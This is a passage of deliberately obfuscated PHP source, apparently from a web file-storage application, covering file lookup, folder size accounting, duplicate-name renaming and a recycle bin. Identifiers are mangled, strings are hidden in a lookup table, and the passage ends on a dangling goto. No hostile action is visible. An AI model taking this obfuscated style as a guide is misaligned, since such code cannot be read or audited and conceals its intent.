(!$¶®óæÀ¹) { return Model($æ¨å£[544])->remove($¾´ÊÊ»–[$æ¨å£[541]]); } $this->folderSizeReset($€ºÀœ£³[$æ¨å£[192]]); return !0; } public function fileSubstr($ËÃÜƒ°©, $¬›†í·Ü, $°Ê€íÖ) { $…æ„ş¹Ë = $this->fileInfoGet($ËÃÜƒ°©); if (!$…æ„ş¹Ë) { return !1; } return IO::fileSubstr($…æ„ş¹Ë[$_SERVER[Ş­ğŠìÒ][87]], $¬›†í·Ü, $°Ê€íÖ); } public function fileInfoGet($¦ÄòÚü) { $¶İ ¦¿° =& $_SERVER[Ş­ğŠìÒ]; $éó×Œ– = $this->sourceInfo($¦ÄòÚü); if (!$éó×Œ– || $éó×Œ–[$¶İ ¦¿°[485]]) { return !1; } $‘Áõ¬óü = $¶İ ¦¿°[548] . $éó×Œ–[$¶İ ¦¿°[541]]; $ïË¬¡£ş = _get(self::$cacheFileInfo, $‘Áõ¬óü); if ($ïË¬¡£ş) { return $ïË¬¡£ş; } $ûŠóˆ”è = Model($¶İ ¦¿°[544])->fileInfo($éó×Œ–[$¶İ ¦¿°[541]]); if ($ûŠóˆ”è) { $ûŠóˆ”è[$¶İ ¦¿°[32]] = $éó×Œ–[$¶İ ¦¿°[32]]; } self::$cacheFileInfo[$‘Áõ¬óü] = $ûŠóˆ”è; return $ûŠóˆ”è; } private function folderChildrenNumber($ıªçü¯¢) { $™«ığ±– =& $_SERVER[Ş­ğŠìÒ]; $î–ŠÊ¦ü = $this->sourceInfo($ıªçü¯¢); $È˜ÚŸ®é = array($™«ığ±–[652] => array($™«ığ±–[612], $î–ŠÊ¦ü[$™«ığ±–[584]] . $ıªçü¯¢ . $™«ığ±–[613]), $™«ığ±–[649] => $î–ŠÊ¦ü[$™«ığ±–[569]], $™«ığ±–[504] => intval($î–ŠÊ¦ü[$™«ığ±–[505]]), $™«ığ±–[646] => 1); $Û­ã‡è = $this->where($È˜ÚŸ®é)->count(); $­ÕÆªŠÁ = $this->where($È˜ÚŸ®é)->where(array($™«ığ±–[646] => 0))->count(); return array($™«ığ±–[83] => $­ÕÆªŠÁ, $™«ığ±–[84] => $Û­ã‡è); } public function pathInfo($­”ÁÊ, $‰™ş¬ı› = false) { $ÃÍØ´ò =& $_SERVER[Ş­ğŠìÒ]; $‰™ş¬ı› = !1; $­”ÁÊ = intval($­”ÁÊ); $³øÒÀ—• = $ÃÍØ´ò[534] . intval($‰™ş¬ı›) . $ÃÍØ´ò[462] . $­”ÁÊ; $¹Œ”¹¯© = _get(self::$cachePathInfo, $³øÒÀ—•); if ($¹Œ”¹¯©) { return $¹Œ”¹¯©; } $Å¿³ğÄµ = $this->sourceInfo($­”ÁÊ); if (!$Å¿³ğÄµ) { return !1; } $Å¿³ğÄµ = $this->_listDataApplyItem($Å¿³ğÄµ, $‰™ş¬ı›); self::$cachePathInfo[$³øÒÀ—•] = $Å¿³ğÄµ; return $Å¿³ğÄµ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Åëá·˜×) { $‹ƒí²Î½ =& $_SERVER[Ş­ğŠìÒ]; $°òı¶É = _get(self::$cachePathInfoMore, $Åëá·˜×); if ($°òı¶É) { return $°òı¶É; } $ıº¡Š²‡ = $this->pathInfo($Åëá·˜×); if (!$ıº¡Š²‡) { return !1; } if ($ıº¡Š²‡[$‹ƒí²Î½[485]] == $‹ƒí²Î½[91]) { $ıº¡Š²‡[$‹ƒí²Î½[82]] = $this->folderChildrenNumber($Åëá·˜×); } self::$cachePathInfoMore[$Åëá·˜×] = $ıº¡Š²‡; return $ıº¡Š²‡; } public function sourceInfo($ŠÊ¼ˆô¹) { $«Ì¢ü¹ =& $_SERVER[Ş­ğŠìÒ]; if (!$ŠÊ¼ˆô¹) { return array(); } $ŠÊ¼ˆô¹ = intval($ŠÊ¼ˆô¹); $âÛ…Ûû = $«Ì¢ü¹[533] . $ŠÊ¼ˆô¹; $©£•¾‹ = _get(self::$cacheSourceInfo, $âÛ…Ûû); if ($©£•¾‹) { return $©£•¾‹; } $ååÉèûü = $this->where(array($«Ì¢ü¹[193] => $ŠÊ¼ˆô¹))->find(); self::$cacheSourceInfo[$âÛ…Ûû] = $ååÉèûü; return self::$cacheSourceInfo[$âÛ…Ûû]; } public function sourceCacheClear($ŸŞÂØü¹ = false) { self::cacheClear($ŸŞÂØü¹); } public static function cacheClear($ûØøÃ±Í = false) { $§ôÜ™Õ» =& $_SERVER[Ş­ğŠìÒ]; if ($ûØøÃ±Í == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$§ôÜ™Õ»[533] . $ûØøÃ±Í]); unset(self::$cachePathInfoMore[$ûØøÃ±Í]); unset(self::$cachePathInfo[$§ôÜ™Õ»[2274] . $ûØøÃ±Í]); unset(self::$cachePathInfo[$§ôÜ™Õ»[2275] . $ûØøÃ±Í]); } public function metaSet($“ñµÑ¹, $è÷©ŞÚÅ = null, $‹ËòÚä† = null) { $‚¯µøæ¢ = parent::metaSet($“ñµÑ¹, $è÷©ŞÚÅ, $‹ËòÚä†); if ($‚¯µøæ¢) { $this->sourceCacheClear($“ñµÑ¹); } return $‚¯µøæ¢; } public function pathInfoByPath($²¶™ˆ¯ä, $ÔøÊÚ) { $Úí±ÃÛÔ =& $_SERVER[Ş­ğŠìÒ]; $³¡‡ Ù› = !$ÔøÊÚ ? array() : explode($Úí±ÃÛÔ[8], trim($ÔøÊÚ, $Úí±ÃÛÔ[8])); $èç´İ Ú = $²¶™ˆ¯ä; foreach ($³¡‡ Ù› as $„Ú—¬ ) { $¯Ú¬ˆ­¦ = array($Úí±ÃÛÔ[192] => $èç´İ Ú, $Úí±ÃÛÔ[32] => $„Ú—¬ ); $šÎï€©à = $this->field($Úí±ÃÛÔ[2276])->where($¯Ú¬ˆ­¦)->select(); if (!$šÎï€©à) { return !1; } $šÎï€©à = array_sort_by($šÎï€©à, $Úí±ÃÛÔ[505]); $èç´İ Ú = $šÎï€©à[0][$Úí±ÃÛÔ[193]]; } $ÄÊğöÊä = $this->sourceInfo($èç´İ Ú); $this->pathInfoFilter($ÄÊğöÊä); return $ÄÊğöÊä; } protected function updateModifyTime($•ãÈ­™) { $ÑŞŞ¼¿ğ =& $_SERVER[Ş­ğŠìÒ]; $ˆïó = defined($ÑŞŞ¼¿ğ[2190]) ? USER_ID : 0; if (!$•ãÈ­™) { return; } if (!is_array($•ãÈ­™)) { $•ãÈ­™ = array($•ãÈ­™); } foreach ($•ãÈ­™ as $ÄäÆõÕÀ => $Š—°Ğ°¦) { $•ãÈ­™[$ÄäÆõÕÀ] = intval($Š—°Ğ°¦); $this->sourceCacheClear($Š—°Ğ°¦); } $Æ§›½Íç = array($ÑŞŞ¼¿ğ[193] => array($ÑŞŞ¼¿ğ[7], $•ãÈ­™)); $ÓÑ×˜ğí = array($ÑŞŞ¼¿ğ[651] => $ˆïó, $ÑŞŞ¼¿ğ[498] => time()); $this->where($Æ§›½Íç)->save($ÓÑ×˜ğí); } public function folderSizeReset($’µ˜Ñä, $¤ğÅ”ô = false) { $©ˆ÷ÚÈÜ =& $_SERVER[Ş­ğŠìÒ]; if ($this->statusIgnoreResetSpace) { return; } $†÷ó†ÉÒ = $this->sourceInfo($’µ˜Ñä); $æİºÏ™¡ = $©ˆ÷ÚÈÜ[2277] . $’µ˜Ñä; CacheLock::lock($æİºÏ™¡, 20); if ($¤ğÅ”ô === !1) { $this->sourceCacheClear($’µ˜Ñä); $†÷ó†ÉÒ = $this->sourceInfo($’µ˜Ñä); $È¬ÁúÊŸ = array($©ˆ÷ÚÈÜ[477] => $’µ˜Ñä, $©ˆ÷ÚÈÜ[504] => 0); $ª™ŒÍ‡Å = $this->where($È¬ÁúÊŸ)->sum($©ˆ÷ÚÈÜ[79]); $¤ğÅ”ô = intval($ª™ŒÍ‡Å) - intval($†÷ó†ÉÒ[$©ˆ÷ÚÈÜ[79]]); } if ($¤ğÅ”ô == 0) { return CacheLock::unlock($æİºÏ™¡); } $ùî›ò‡Ô = $this->parentLevelArray($†÷ó†ÉÒ[$©ˆ÷ÚÈÜ[584]]); if (!$ùî›ò‡Ô) { $ùî›ò‡Ô = array(); } $ùî›ò‡Ô[] = $†÷ó†ÉÒ[$©ˆ÷ÚÈÜ[193]]; $È¬ÁúÊŸ = array($©ˆ÷ÚÈÜ[193] => array($©ˆ÷ÚÈÜ[492], $ùî›ò‡Ô)); if ($¤ğÅ”ô < 0) { $È¬ÁúÊŸ[$©ˆ÷ÚÈÜ[79]] = array($©ˆ÷ÚÈÜ[1089], abs($¤ğÅ”ô)); } $this->where($È¬ÁúÊŸ)->setAdd($©ˆ÷ÚÈÜ[79], $¤ğÅ”ô); CacheLock::unlock($æİºÏ™¡); $ƒÙÊå = $©ˆ÷ÚÈÜ[2278] . $†÷ó†ÉÒ[$©ˆ÷ÚÈÜ[190]] . $©ˆ÷ÚÈÜ[4] . $†÷ó†ÉÒ[$©ˆ÷ÚÈÜ[569]]; $ïÄáÔŸ® = array($†÷ó†ÉÒ[$©ˆ÷ÚÈÜ[190]], $†÷ó†ÉÒ[$©ˆ÷ÚÈÜ[569]]); TaskRun::timeLimitCall($ƒÙÊå, $©ˆ÷ÚÈÜ[2279], $ïÄáÔŸ®, 1.5); } public function folderSizeResetChildren($Ø‰ÒîåÙ) { $ÅĞ¿ÑØ =& $_SERVER[Ş­ğŠìÒ]; $this->sourceCacheClear($Ø‰ÒîåÙ); $³¤Û’Ï = $this->sourceInfo($Ø‰ÒîåÙ); $Í²Äœ = array($ÅĞ¿ÑØ[646] => 1, $ÅĞ¿ÑØ[649] => $³¤Û’Ï[$ÅĞ¿ÑØ[569]], $ÅĞ¿ÑØ[652] => array($ÅĞ¿ÑØ[612], $³¤Û’Ï[$ÅĞ¿ÑØ[584]] . $Ø‰ÒîåÙ . $ÅĞ¿ÑØ[613])); $‡Å›¿“Ò = $ÅĞ¿ÑØ[2280]; $–œ°ÁßŠ = $this->field($‡Å›¿“Ò)->where($Í²Äœ)->select(); $Í²Äœ[$ÅĞ¿ÑØ[485]] = 0; $üÖæìç = $this->field($‡Å›¿“Ò)->where($Í²Äœ)->select(); if (!$üÖæìç) { return; } $–œ°ÁßŠ[] = $³¤Û’Ï; $–œ°ÁßŠ = array_to_keyvalue($–œ°ÁßŠ, $ÅĞ¿ÑØ[193]); foreach ($–œ°ÁßŠ as $½–Ã¥¹ı => $Âã‚Û¢) { $–œ°ÁßŠ[$½–Ã¥¹ı][$ÅĞ¿ÑØ[2281]] = $–œ°ÁßŠ[$½–Ã¥¹ı][$ÅĞ¿ÑØ[79]]; $–œ°ÁßŠ[$½–Ã¥¹ı][$ÅĞ¿ÑØ[79]] = 0; } foreach ($üÖæìç as $Âã‚Û¢) { $Íã±êçÁ = $Âã‚Û¢[$ÅĞ¿ÑØ[192]] . $ÅĞ¿ÑØ[12]; if (!isset($–œ°ÁßŠ[$Íã±êçÁ])) { continue; } if ($Âã‚Û¢[$ÅĞ¿ÑØ[505]] == $–œ°ÁßŠ[$Íã±êçÁ][$ÅĞ¿ÑØ[505]]) { $–œ°ÁßŠ[$Íã±êçÁ][$ÅĞ¿ÑØ[79]] += $Âã‚Û¢[$ÅĞ¿ÑØ[79]]; } } foreach ($–œ°ÁßŠ as $Âã‚Û¢) { $¢ïè‡øÎ = $this->parentLevelArray($Âã‚Û¢[$ÅĞ¿ÑØ[584]]); foreach ($¢ïè‡øÎ as $Íã±êçÁ) { $Íã±êçÁ = $Íã±êçÁ . $ÅĞ¿ÑØ[12]; if (!isset($–œ°ÁßŠ[$Íã±êçÁ])) { continue; } if ($Âã‚Û¢[$ÅĞ¿ÑØ[505]] == $–œ°ÁßŠ[$Íã±êçÁ][$ÅĞ¿ÑØ[505]]) { $–œ°ÁßŠ[$Íã±êçÁ][$ÅĞ¿ÑØ[79]] += $Âã‚Û¢[$ÅĞ¿ÑØ[79]]; } } } $Š¬¸§ç« = array(); foreach ($–œ°ÁßŠ as $Âã‚Û¢) { if ($Âã‚Û¢[$ÅĞ¿ÑØ[79]] == $Âã‚Û¢[$ÅĞ¿ÑØ[2281]]) { continue; } $Š¬¸§ç«[] = array($ÅĞ¿ÑØ[193], $Âã‚Û¢[$ÅĞ¿ÑØ[193]], $ÅĞ¿ÑØ[79], $Âã‚Û¢[$ÅĞ¿ÑØ[79]]); } $this->saveAll($Š¬¸§ç«); } public function userSpaceReset($ÆŒÕ§ = false) { $‡ñ½Ş´Ô =& $_SERVER[Ş­ğŠìÒ]; $¶ªÚÄÑÜ = $this->where(array($‡ñ½Ş´Ô[190] => self::TYPE_USER, $‡ñ½Ş´Ô[569] => $ÆŒÕ§, $‡ñ½Ş´Ô[485] => 0))->sum($‡ñ½Ş´Ô[79]); $¶ªÚÄÑÜ = !$¶ªÚÄÑÜ || $¶ªÚÄÑÜ <= 0 ? 0 : $¶ªÚÄÑÜ; Model($‡ñ½Ş´Ô[577])->userEdit($ÆŒÕ§, array($‡ñ½Ş´Ô[1951] => $¶ªÚÄÑÜ)); } public function targetSpaceUpdate($äÃ×„û¯, $’ÓÒºö½) { $¡˜öäø­ =& $_SERVER[Ş­ğŠìÒ]; if (!$’ÓÒºö½) { return; } if (!in_array($äÃ×„û¯, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $Óõ­òÑ = $this->targetSpaceSize($äÃ×„û¯, $’ÓÒºö½); if ($äÃ×„û¯ == self::TYPE_USER) { Model($¡˜öäø­[577])->userEdit($’ÓÒºö½, array($¡˜öäø­[1951] => $Óõ­òÑ)); } else { if ($äÃ×„û¯ == self::TYPE_GROUP) { Model($¡˜öäø­[585])->groupEdit($’ÓÒºö½, array($¡˜öäø­[1951] => $Óõ­òÑ)); } } } public function targetSpaceSize($‡şÛ†Ãı, $ğÊ©Ïú) { $Ø¸öıÆê =& $_SERVER[Ş­ğŠìÒ]; $Ëñ³†¥‹ = 0; $€ÆÔ°¤¥ = $this->targetSourceRoot($‡şÛ†Ãı, $ğÊ©Ïú, !0); foreach ($€ÆÔ°¤¥ as $á¬¿¢á) { if (!$á¬¿¢á) { continue; } $Ëñ³†¥‹ += floatval($á¬¿¢á[$Ø¸öıÆê[79]]); $¦®Á’¶ = array($Ø¸öıÆê[652] => array($Ø¸öıÆê[612], $Ø¸öıÆê[594] . $á¬¿¢á[$Ø¸öıÆê[193]] . $Ø¸öıÆê[613])); $¨ˆ­ºµÂ = Model($Ø¸öıÆê[503])->field($Ø¸öıÆê[491])->where($¦®Á’¶)->select(); $¨ˆ­ºµÂ = array_to_keyvalue($¨ˆ­ºµÂ, $Ø¸öıÆê[12], $Ø¸öıÆê[193]); $¨ˆ­ºµÂ = array_unique(array_filter($¨ˆ­ºµÂ)); if ($¨ˆ­ºµÂ) { $¦®Á’¶ = array($Ø¸öıÆê[491] => array($Ø¸öıÆê[492], $¨ˆ­ºµÂ)); $Ëñ³†¥‹ += floatval($this->where($¦®Á’¶)->sum($Ø¸öıÆê[79])); } } $Ëñ³†¥‹ = !$Ëñ³†¥‹ || $Ëñ³†¥‹ <= 0 ? 0 : $Ëñ³†¥‹; return $Ëñ³†¥‹; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($±•—¦ó‚) { return $this->fileTypeProfile($±•—¦ó‚, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ğ‰«ååº) { return $this->fileTypeProfile($ğ‰«ååº, SourceModel::TYPE_GROUP); } private function fileTypeProfile($è¦ôÙ™Œ, $¡ÔØŞœ¬) { $õÜ‹¡£Œ =& $_SERVER[Ş­ğŠìÒ]; $çª÷‘“Ş = $õÜ‹¡£Œ[2282] . $è¦ôÙ™Œ . $õÜ‹¡£Œ[11] . $¡ÔØŞœ¬; $ŒÔÎ»ÎÜ = Cache::get($çª÷‘“Ş); if ($ŒÔÎ»ÎÜ) { return $ŒÔÎ»ÎÜ; } $¬Í´¸Íó = array($õÜ‹¡£Œ[646] => 0); if ($è¦ôÙ™Œ != !1) { $¬Í´¸Íó[$õÜ‹¡£Œ[569]] = $è¦ôÙ™Œ; $¬Í´¸Íó[$õÜ‹¡£Œ[190]] = $¡ÔØŞœ¬; } $èä‰ÂÙ° = array(); $èä‰ÂÙ°[$õÜ‹¡£Œ[2283]] = array($õÜ‹¡£Œ[2284] => LNG($õÜ‹¡£Œ[2283]), $õÜ‹¡£Œ[2285] => $this->where($¬Í´¸Íó)->count(), $õÜ‹¡£Œ[617] => $this->where($¬Í´¸Íó)->sum($õÜ‹¡£Œ[79])); $”¨˜¡²¼ = KodIO::fileTypeList(); foreach ($”¨˜¡²¼ as $Ùâàí×€ => $‡Ëİ‹¯Ä) { $¬Í´¸Íó[$õÜ‹¡£Œ[486]] = $this->fileTypeWhere($Ùâàí×€); $èä‰ÂÙ°[$Ùâàí×€] = array($õÜ‹¡£Œ[2284] => $‡Ëİ‹¯Ä[$õÜ‹¡£Œ[32]], $õÜ‹¡£Œ[2285] => $this->where($¬Í´¸Íó)->count(), $õÜ‹¡£Œ[617] => $this->where($¬Í´¸Íó)->sum($õÜ‹¡£Œ[79])); } Cache::set($çª÷‘“Ş, $èä‰ÂÙ°, 1200); return $èä‰ÂÙ°; } public function fileNameExist($ğŸæ¹Êª, $”ºê­Üä) { $¢´Û–÷ø =& $_SERVER[Ş­ğŠìÒ]; $½ı­˜Ü‚ = $this->field($¢´Û–÷ø[2286])->where(array($¢´Û–÷ø[192] => $ğŸæ¹Êª, $¢´Û–÷ø[32] => $”ºê­Üä, $¢´Û–÷ø[505] => 0))->find(); return is_array($½ı­˜Ü‚) ? $½ı­˜Ü‚[$¢´Û–÷ø[193]] : !1; } public function childList($ïÙ¼ÜÄ¾) { $Ô‰×İİÂ =& $_SERVER[Ş­ğŠìÒ]; $‰¶‘İÒ¶ = $Ô‰×İİÂ[2258] . $ïÙ¼ÜÄ¾; if (isset(self::$cacheChildList[$‰¶‘İÒ¶])) { return self::$cacheChildList[$‰¶‘İÒ¶]; } $úá‚–¼ï = array($Ô‰×İİÂ[192] => intval($ïÙ¼ÜÄ¾), $Ô‰×İİÂ[505] => 0); $Ä•¨äÆ‡ = $this->where($úá‚–¼ï)->select(); $Ä•¨äÆ‡ = $Ä•¨äÆ‡ ? $Ä•¨äÆ‡ : array(); self::$cacheChildList[$‰¶‘İÒ¶] = $Ä•¨äÆ‡; foreach ($Ä•¨äÆ‡ as $Ø™®îØæ) { $‰¶‘İÒ¶ = $Ô‰×İİÂ[533] . $Ø™®îØæ[$Ô‰×İİÂ[193]]; self::$cacheSourceInfo[$‰¶‘İÒ¶] = $Ø™®îØæ; } return $Ä•¨äÆ‡; } public function fileNameAuto($Ë¢‘ëß¿, $«ï½¿§Á, $ŒÎÌ÷È… = REPEAT_RENAME, $‹ğŞŸÔç = false) { $àÜéºÉê =& $_SERVER[Ş­ğŠìÒ]; $›Û×ŞßÉ = get_path_ext($«ï½¿§Á); $Ÿ¦Æ “„ = $›Û×ŞßÉ ? get_path_ext_name($«ï½¿§Á) . $àÜéºÉê[2287] . $›Û×ŞßÉ : $«ï½¿§Á . $àÜéºÉê[460]; $¸Ä÷¯ = array($àÜéºÉê[192] => $Ë¢‘ëß¿, $àÜéºÉê[505] => 0, $àÜéºÉê[32] => array($àÜéºÉê[459], $Ÿ¦Æ “„)); $ÊÔı€À’ = $this->field($àÜéºÉê[32])->where($¸Ä÷¯)->select(); $ˆ“¦‰èÃ = array_to_keyvalue($ÊÔı€À’, $àÜéºÉê[12], $àÜéºÉê[32]); return $this->fileNameAutoGet($ˆ“¦‰èÃ, $«ï½¿§Á, $ŒÎÌ÷È…, $‹ğŞŸÔç); } public function fileNameAutoGet($˜Ù­íŞò, $Ÿ×ß­ıÖ, $Â—ê±¶™, $ç¸½¡¥) { $ØÈÇ¶Øİ =& $_SERVER[Ş­ğŠìÒ]; if ($Â—ê±¶™ == REPEAT_REPLACE || !$˜Ù­íŞò || !in_array_not_case($Ÿ×ß­ıÖ, $˜Ù­íŞò) || $ç¸½¡¥ && $Â—ê±¶™ != REPEAT_RENAME_FOLDER) { return $Ÿ×ß­ıÖ; } if ($Â—ê±¶™ == REPEAT_SKIP) { return !1; } $Ì“À©²– = $ØÈÇ¶Øİ[10] . get_path_ext($Ÿ×ß­ıÖ); $Ì“À©²– = $Ì“À©²– == $ØÈÇ¶Øİ[10] || $ç¸½¡¥ ? $ØÈÇ¶Øİ[12] : $Ì“À©²–; for ($ı¤Ê¼Üà = 1; $ı¤Ê¼Üà <= count($˜Ù­íŞò) + 1; $ı¤Ê¼Üà++) { $ğÄµ¯ø‚ = substr($Ÿ×ß­ıÖ, 0, strlen($Ÿ×ß­ıÖ) - strlen($Ì“À©²–)); $ıïû À = $ğÄµ¯ø‚ . "\50{$ı¤Ê¼Üà}\x29{$Ì“À©²–}"; if (!in_array_not_case($ıïû À, $˜Ù­íŞò)) { return $ıïû À; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\x72\143\x65\x5f\162\x65\x63\x79\x63\154\x65"; protected $dataAuto = array(array("\143\x72\x65\x61\164\145\124\x69\x6d\x65", "\x74\x69\x6d\145", "\151\156\x73\145\x72\164", "\146\165\x6e\x63\x74\151\157\156")); public function listData($ºü³Ôî¬ = false) { $¾ÜËÌú© =& $_SERVER[Ş­ğŠìÒ]; $ºü³Ôî¬ = $ºü³Ôî¬ ? $ºü³Ôî¬ : USER_ID; $Šó¥˜€ô = $this->where(array($¾ÜËÌú©[1755] => $ºü³Ôî¬))->select(); return array_to_keyvalue($Šó¥˜€ô, $¾ÜËÌú©[12], $¾ÜËÌú©[193]); } public function moveToRecycle($åË“†¿®) { $áğ»»¶Á =& $_SERVER[Ş­ğŠìÒ]; $½‡Â¾Ò– = Model($áğ»»¶Á[1414]); $¾«–¡êµ = $½‡Â¾Ò–->sourceInfo($åË“†¿®); if (!$¾«–¡êµ || $¾«–¡êµ[$áğ»»¶Á[505]] == $áğ»»¶Á[91]) { return; } $™«Ï¾Ãñ = array($áğ»»¶Á[491] => $åË“†¿®, $áğ»»¶Á[1755] => USER_ID, $áğ»»¶Á[648] => $¾«–¡êµ[$áğ»»¶Á[190]], $áğ»»¶Á[649] => $¾«–¡êµ[$áğ»»¶Á[569]], $áğ»»¶Á[652] => $¾«–¡êµ[$áğ»»¶Á[584]]); $this->add($™«Ï¾Ãñ); $this->recycleMove($åË“†¿®, 1); if ($¾«–¡êµ[$áğ»»¶Á[485]] == $áğ»»¶Á[91]) { $ËµãÃı¾ = array($áğ»»¶Á[652] => array($áğ»»¶Á[612], $¾«–¡êµ[$áğ»»¶Á[584]] . $åË“†¿® . $áğ»»¶Á[613])); $½‡Â¾Ò–->where($ËµãÃı¾)->setField($áğ»»¶Á[505], 1); } } public function clear() { $this->remove(!1); } public function remove($íñêı‰µ = false, $ğç¦»×‰ = false) { $„ïÈªôŒ =& $_SERVER[Ş­ğŠìÒ]; $ğç¦»×‰ = $ğç¦»×‰ ? $ğç¦»×‰ : USER_ID; $›ÎìœÑ² = Model($„ïÈªôŒ[1414]); $ò“Ğ’ó = $this->listData($ğç¦»×‰); $íñêı‰µ = $íñêı‰µ === !1 ? !1 : $íñêı‰µ; $’‚îº°ô = array(); foreach ($ò“Ğ’ó as $‘ìÀüÅá) { if ($íñêı‰µ != !1 && !in_array($‘ìÀüÅá, $íñêı‰µ)) { continue; } $ÂÑº¼ = $›ÎìœÑ²->sourceInfo($‘ìÀüÅá); $›ÎìœÑ²->remove($‘ìÀüÅá, !1); $«£‚”É = $ÂÑº¼[$„ïÈªôŒ[190]] . $„ïÈªôŒ[11] . $ÂÑº¼[$„ïÈªôŒ[569]]; $’‚îº°ô[$«£‚”É] = array($„ïÈªôŒ[648] => $ÂÑº¼[$„ïÈªôŒ[190]], $„ïÈªôŒ[569] => $ÂÑº¼[$„ïÈªôŒ[569]]); $this->where(array($„ïÈªôŒ[193] => $‘ìÀüÅá))->delete(); } foreach ($’‚îº°ô as $¾´‡×²­) { $›ÎìœÑ²->targetSpaceUpdate($¾´‡×²­[$„ïÈªôŒ[190]], $¾´‡×²­[$„ïÈªôŒ[569]]); } } public function restore($íŞ‡†¬¿ = false) { $Ãğ—áµ– = $this->listData(); $this->_restoreSource($Ãğ—áµ–, $íŞ‡†¬¿); } public function removeUserAll($õÅĞ¾Ø¶) { $this->remove(!1, $õÅĞ¾Ø¶); } public function restoreItem($œ¢¨ÙùÒ) { $this->_restoreSource(array($œ¢¨ÙùÒ), array($œ¢¨ÙùÒ)); } private function _restoreSource($…ìÜŒµ, $‚©Àø) { $Ü¤¬Ö³ª =& $_SERVER[Ş­ğŠìÒ]; $ı©Ş£Íä = Model($Ü¤¬Ö³ª[1414]); $‚©Àø = $‚©Àø == !1 ? !1 : $‚©Àø; if (!$…ìÜŒµ) { return !0; } $ƒÈÙÅÖ‚ = array(); foreach ($…ìÜŒµ as $µÁÖ×Â) { if ($‚©Àø != !1 && !in_array($µÁÖ×Â, $‚©Àø)) { continue; } $é±êúÖÏ = $ı©Ş£Íä->sourceInfo($µÁÖ×Â); $¤³†ß” = $ı©Ş£Íä->sourceInfo($é±êúÖÏ[$Ü¤¬Ö³ª[192]]); if ($¤³†ß”[$Ü¤¬Ö³ª[505]] == $Ü¤¬Ö³ª[91]) { continue; } $ı©Ş£Íä->lockMoveStart($µÁÖ×Â); $this->recycleMove($µÁÖ×Â, 0); if ($é±êúÖÏ[$Ü¤¬Ö³ª[485]] == $Ü¤¬Ö³ª[91]) { $ş›ÌœŸŠ = array($Ü¤¬Ö³ª[652] => array($Ü¤¬Ö³ª[612], $é±êúÖÏ[$Ü¤¬Ö³ª[584]] . $µÁÖ×Â . $Ü¤¬Ö³ª[613])); $ı©Ş£Íä->where($ş›ÌœŸŠ)->setField($Ü¤¬Ö³ª[505], 0); $this->restoreFolderChildren($µÁÖ×Â, $…ìÜŒµ); } $this->where(array($Ü¤¬Ö³ª[193] => $µÁÖ×Â))->delete(); $ı©Ş£Íä->folderSizeReset($é±êúÖÏ[$Ü¤¬Ö³ª[192]]); $ƒÈÙÅÖ‚[] = $é±êúÖÏ[$Ü¤¬Ö³ª[192]]; if ($é±êúÖÏ[$Ü¤¬Ö³ª[485]] == $Ü¤¬Ö³ª[91]) { $ƒÈÙÅÖ‚[] = $µÁÖ×Â; } $ı©Ş£Íä->lockMoveEnd($µÁÖ×Â); } $ı©Ş£Íä->updateModifyTime($ƒÈÙÅÖ‚); } private function restoreFolderChildren($¦×‰½…£, $´ÉäÂ¼ä) { $€©øİß =& $_SERVER[Ş­ğŠìÒ]; $÷Ëè¹É = Model($€©øİß[1414]); $•Ñ§ÁÁÛ = array($€©øİß[193] => array($€©øİß[7], array())); foreach ($´ÉäÂ¼ä as $Õª¹ğòØ) { if ($Õª¹ğòØ == $¦×‰½…£) { continue; } if (!$÷Ëè¹É->isParentOf($¦×‰½…£, $Õª¹ğòØ)) { continue; } $à‰¾²ØÕ = $÷Ëè¹É->sourceInfo($Õª¹ğòØ); if ($à‰¾²ØÕ[$€©øİß[485]] == $€©øİß[91]) { $•Ñ§ÁÁÛ[] = array($€©øİß[652] => array($€©øİß[612], $à‰¾²ØÕ[$€©øİß[584]] . $Õª¹ğòØ . $€©øİß[613])); } else { $•Ñ§ÁÁÛ[$€©øİß[193]][1][] = $Õª¹ğòØ; } } if (!$•Ñ§ÁÁÛ[$€©øİß[193]][1]) { unset($•Ñ§ÁÁÛ[$€©øİß[193]]); } if (!$•Ñ§ÁÁÛ) { return; } if (is_array($•Ñ§ÁÁÛ[$€©øİß[193]]) && is_array($•Ñ§ÁÁÛ[$€©øİß[193]][1])) { $•Ñ§ÁÁÛ[$€©øİß[193]][1] = array_unique($•Ñ§ÁÁÛ[$€©øİß[193]][1]); } $•Ñ§ÁÁÛ[$€©øİß[1074]] = $€©øİß[2066]; $÷Ëè¹É->where($•Ñ§ÁÁÛ)->setField($€©øİß[505], 1); } private function recycleMove($º½‚‚í‹, $Ë«‘Ÿ = 1) { $ø¢¶ö˜ =& $_SERVER[Ş­ğŠìÒ]; $Ä­Àº½Ò = Model($ø¢¶ö˜[1414]); $‡Ù§¹´ = Model($ø¢¶ö˜[2288]); $çæ©ÛêŸ = array($ø¢¶ö˜[193] => $º½‚‚í‹); if ($Ë«‘Ÿ) { $Ä­Àº½Ò->where($çæ©ÛêŸ)->setField($ø¢¶ö˜[505], 1); $‡Ù§¹´->eventRecycle($º½‚‚í‹, $ø¢¶ö˜[2289]); } else { $°ö ¸® = $Ä­Àº½Ò->where($çæ©ÛêŸ)->find(); $²ÆŞ¼·½ = $°ö ¸®[$ø¢¶ö˜[485]] == $ø¢¶ö˜[91]; $šáë¯æÔ = $Ä­Àº½Ò->fileNameAuto($°ö ¸®[$ø¢¶ö˜[192]], $°ö ¸®[$ø¢¶ö˜[32]], REPEAT_RENAME_FOLDER, $²ÆŞ¼·½); if ($šáë¯æÔ != $°ö ¸®[$ø¢¶ö˜[32]]) { $Ä­Àº½Ò->rename($º½‚‚í‹, $šáë¯æÔ); } $Ä­Àº½Ò->where($çæ©ÛêŸ)->setField($ø¢¶ö˜[505], 0); $‡Ù§¹´->eventRecycle($º½‚‚í‹, $ø¢¶ö˜[2290]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\163\157\165\162\x63\x65\x53\145\x63\x72\145\164\x4c\x69\x73\164"; public $field = array("\163\x6f\x75\x72\x63\145\111\104", "\x74\171\160\x65\111\x44", "\x63\x72\x65\141\164\x65\x55\163\145\162"); } goto D½Àï«Ûã²; 